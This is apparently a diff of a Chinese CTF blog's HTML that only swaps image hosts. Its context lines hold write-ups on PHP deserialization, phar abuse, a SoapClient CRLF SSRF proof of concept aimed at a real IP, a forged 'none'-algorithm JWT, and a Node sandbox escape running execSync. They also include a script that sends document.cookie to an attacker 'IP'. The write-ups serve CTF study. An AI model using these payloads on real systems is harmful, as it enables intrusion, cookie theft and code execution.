 <h2 id="结合魔法函数构造poc链"><a href="#结合魔法函数构造poc链" class="headerlink" title="结合魔法函数构造poc链"></a><strong>结合魔法函数构造poc链</strong></h2><p>通常来说有一些PHP的魔法函数会导致反序列化漏洞，如：</p>
 <p><code>__construct</code> 当一个对象创建时自动调用</p>
@@ -2717,7 +2719,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> A();</span><br><span class="line">$c = serialize($c);</span><br><span class="line"><span class="keyword">echo</span> $c;</span><br></pre></td></tr></table></figure>
 
 <p>输出<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;;&#125;</code></p>
-<img src="http://img.kawhi.xyz/image-20200711123022767.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123022767.png" style="high:80%;width:80%;" />
 
 <p>可以看到直接导致xss攻击，如果<code>__wakeup</code>中不是<code>echo()</code>，而是<code>eval()</code>那么就是任意代码执行，危害就更大了。</p>
 <p>把<code>echo()</code>修改为<code>eval()</code>，如下：</p>
@@ -2725,7 +2727,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>传入<code>O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</code></p>
 <p>可以看到已经成功执行php代码。</p>
-<img src="http://img.kawhi.xyz/image-20200711123529023.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711123529023.png" style="high:80%;width:80%;" />
 
 <h2 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a><strong>一些知识点</strong></h2><h3 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a><strong>wakeup绕过</strong></h3><p>这是在攻防世界刷到的一题，通过这道题认识怎么绕过。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -2737,7 +2739,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>
 
 <h3 id="私有属性绕过"><a href="#私有属性绕过" class="headerlink" title="私有属性绕过"></a><strong>私有属性绕过</strong></h3><p>首先来看看这样一段代码</p>
-<img src="http://img.kawhi.xyz/image-20200711220816401.png" style="high:70%;width:70%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711220816401.png" style="high:70%;width:70%;" />
 
 <p>这里要注意</p>
 <ul>
@@ -2770,13 +2772,13 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>漏洞产生的原因</p>
 <p>使用<code>Phar://</code>伪协议去读取Phar文件时候，文件会被当做phar对象，meta-data部分会被反序列化。phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖<code>unserialize()</code>直接进行反序列化操作。</p>
 <p>这里贴一下受影响的文件系统函数列表。</p>
-<img src="http://img.kawhi.xyz/image-20200711232201316.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232201316.png" style="high:80%;width:80%;" />
 
 <p>举一个小栗子：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 生成phar 文件的格式</span></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里的话需要把php.ini的;phar.readonly = On改为phar.readonly = Off，否则无法生成phar文件。</p>
-<img src="http://img.kawhi.xyz/image-20200711232430900.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711232430900.png" style="high:80%;width:80%;" />
 
 <p>可以看到已经成功输出字符。当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，极大的拓展了攻击面。</p>
 <p><strong>phar的伪造</strong></p>
@@ -2829,13 +2831,13 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>考虑到可能是序列化引擎不同导致的session反序列漏洞</p>
 <p>然后查看一下phpinfo的信息</p>
-<img src="http://img.kawhi.xyz/image-20200711211409836.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211409836.png" style="high:80%;width:80%;" />
 
 <p>发现存储和读取session时用到的处理器引擎不一样。</p>
 <p>现在有个问题，session是怎么传进去的呢，平时都是有个<code>$_SESSION=$_GET[&#39;a&#39;]</code>，通过参数a传进去，本题没有$_SESSION进行变量赋值，这种情况我们可以用php文件上传进度来解决。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200711211709331.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711211709331.png" style="high:80%;width:80%;" />
 
 <p>session.upload_progress.enabled刚好都是开启的。我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候，PHP会将文件名保存在$_SESSION中。</p>
 <p>于是这里我们构造表单</p>
@@ -2857,23 +2859,23 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>然后得到文件名Here_1s_7he_fl4g_buT_You_Cannot_see.php</p>
 <p>得到文件名之后还得查看路径，在phpinfo里面查看</p>
-<img src="http://img.kawhi.xyz/image-20200711213050621.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213050621.png" style="high:80%;width:80%;" />
 
 <p>得到路径之后改下payload即可得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200711213202557.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711213202557.png" style="high:80%;width:80%;" />
 
 <h3 id="反序列化原生类的利用"><a href="#反序列化原生类的利用" class="headerlink" title="反序列化原生类的利用"></a><strong>反序列化原生类的利用</strong></h3><p>什么情况需要考虑原生类呢，题目找不到POP链的时候可以考虑PHP原生类。</p>
 <h4 id="call的原生类"><a href="#call的原生类" class="headerlink" title="__call的原生类"></a>__call的原生类</h4><p>SoapClient算是目前被比较好用的一个内置类，php5、7都存在此类。正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法。</p>
 <p>先来看这样一段代码</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;kawhi&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://134.175.168.213:5555/path&#x27;</span>));</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200712162931204.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712162931204.png" style="high:80%;width:80%;" />
 
 <p>可以看出，SOAPAction处可控，这里要注意的是如果Content-Type在SOAPAction的上面，就无法控制Content-Type，也就不能控制POST的数据，这里的局限性就是仅限于http/https协议，但是这里http头部还存在crlf漏洞，可以把<code>\r\n</code>即<code>%0d%0a</code>注入到SOAPAction，POST请求的header就可以被控制。</p>
 <p>这里贴一下wupco师傅的poc</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">&quot;http://134.175.168.213:5555/&quot;</span>;</span><br><span class="line">$post_string = <span class="string">&#x27;data=kawhi&#x27;</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span></span><br><span class="line">);</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; $target,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="string">&#x27;^^&#x27;</span>,$headers).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)strlen($post_string).<span class="string">&#x27;^^^^&#x27;</span>.$post_string,<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line">$c = unserialize($a);</span><br><span class="line">$c-&gt;not_exists_function();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200712164137201.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200712164137201.png" style="high:80%;width:80%;" />
 
 <p>从上图可以看出使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p>
 <p>这里有一道buu的题bestphp’s revenge可以结合SoapClient和上面的session反序列化一起理解，这里有个writeup写的很详细，这里不再赘述。</p>
@@ -2894,7 +2896,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>可以看到已经成功弹窗</p>
-<img src="http://img.kawhi.xyz/image-20200711143646347.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143646347.png" style="high:80%;width:80%;" />
 
 <p><strong>Exception</strong></p>
 <p>适用于php5、7版本</p>
@@ -2906,7 +2908,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>同样成功弹窗。</p>
-<img src="http://img.kawhi.xyz/image-20200711143829700.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711143829700.png" style="high:80%;width:80%;" />
 
 <p>本题payload为</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = serialize(<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;IP&#x27;+document.cookie&lt;/script&gt;&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
@@ -3273,7 +3275,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
 <p>jwt可以通过这个网站解析：<a class="foo" target="_blank" href="https://jwt.io/">传送门</a></p>
-<img src="http://img.kawhi.xyz/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423184848460.png" alt="image-20200423184848460" style="high:80%;width:80%;" />
 
 <p>了解JWT的组成后，我们总结JWT可能存在如下的安全问题：</p>
 <blockquote>
@@ -3294,7 +3296,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6MC41LCJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGxlZCI6Im5vIiwiaWF0IjoxNTg3NjQ0MDk4fQ.</span><br></pre></td></tr></table></figure>
 
 <p>然后改包发送：</p>
-<img src="http://img.kawhi.xyz/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423211337775.png" alt="image-20200423211337775" style="high:80%;width:80%;" />
 
 <p>再放包放到home这个页面就可以刷新网页进入getflag的界面了。再抓getflag的包发送即可看到flag。</p>
 <p>这上面是师兄的思路，官方的脚本如下：</p>
@@ -3306,7 +3308,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>.prototype.get_process = <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">&quot;return process&quot;</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">&quot;&quot;</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e.get_process(<span class="function">()=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami&quot;</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
 
 <p>直接使用的话发现存在waf:</p>
-<img src="http://img.kawhi.xyz/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200423213317676.png" alt="image-20200423213317676" style="high:80%;width:80%;" />
 
 <p>fuzz发现程序过滤了以下关键字：</p>
 <p>process, exec, eval, constructor, prototype, Function, 加号, 双引号, 单引号被过滤</p>
@@ -3337,28 +3339,28 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>可以得知修改attr为空，文件名为sess，便可以伪造session文件。</p>
 <p>下一步就是利用download读取自己的session，发现session内容格式，得知session引起为php_binary。</p>
-<img src="http://img.kawhi.xyz/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145858004.png" alt="image-20200424145858004" style="high:60%;width:60%;" />
 
 <p>在源代码里面是这样的</p>
-<img src="http://img.kawhi.xyz/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424145951565.png" alt="image-20200424145951565" style="high:60%;width:60%;" />
 
 <p>然后直接复制出来保存在sess的文件里面，并把guest改为admin。并上传到靶机上面：</p>
-<img src="http://img.kawhi.xyz/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150334856.png" alt="image-20200424150334856" style="high:80%;width:80%;" />
 
 <p>然后可以测试出来sess的文件的hash值：</p>
-<img src="http://img.kawhi.xyz/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150522602.png" alt="image-20200424150522602" style="high:80%;width:80%;" />
 
 <p>然后可以用download的方式查看一下是否上传成功了：</p>
-<img src="http://img.kawhi.xyz/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150642155.png" alt="image-20200424150642155" style="high:80%;width:80%;" />
 
-<img src="http://img.kawhi.xyz/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424150705164.png" alt="image-20200424150705164" style="high:80%;width:80%;" />
 
 <p>可以看到已经成功改为admin。</p>
 <p>不过还需要有一个success.txt，由于他这里用的是file_exists，所以我们令attr=success.txt使之成为一个路径也能通过检测。然后这里的文件随便填就行。</p>
-<img src="http://img.kawhi.xyz/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154207639.png" alt="image-20200424154207639" style="high:80%;width:80%;" />
 
 <p>这样两个条件都满足了，抓包改PHPSESSID即可得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424154520097.png" alt="image-20200424154520097" style="high:80%;width:80%;" />
 
 <h2 id="MRCTF"><a href="#MRCTF" class="headerlink" title="MRCTF"></a><strong>MRCTF</strong></h2><h3 id="你能看懂音符吗"><a href="#你能看懂音符吗" class="headerlink" title="你能看懂音符吗"></a><strong>你能看懂音符吗</strong></h3><p>用010打开后改一下发现文件头被改，把61 52改为52 61即可。</p>
 <p>然后发现打开docx，显示隐藏文字，然后发现一段音符：</p>
@@ -3376,11 +3378,11 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>1.wav换成题目的wav即可。结果为：18684221609。</p>
 <h3 id="Hello-misc"><a href="#Hello-misc" class="headerlink" title="Hello_ misc"></a><strong>Hello_ misc</strong></h3><p>打开题目是一个压缩包和一张图片：</p>
-<img src="http://img.kawhi.xyz/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424211603839.png" alt="image-20200424211603839" style="high:60%;width:60%;" />
 
 <p>binwalk这个try图片可以得到一个ZIP压缩包。</p>
 <p>然后再用用<code>stegsolve</code>查看图片，<code>Save Bin</code>可直接得到图片：</p>
-<img src="http://img.kawhi.xyz/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200424212518740.png" alt="image-20200424212518740" style="high:80%;width:80%;" />
 
 <p>用图片上的密码打开ZIP压缩包。发现文档信息：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">255</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line"><span class="number">191</span></span><br><span class="line"><span class="number">63</span></span><br><span class="line"><span class="number">127</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
@@ -3392,10 +3394,10 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
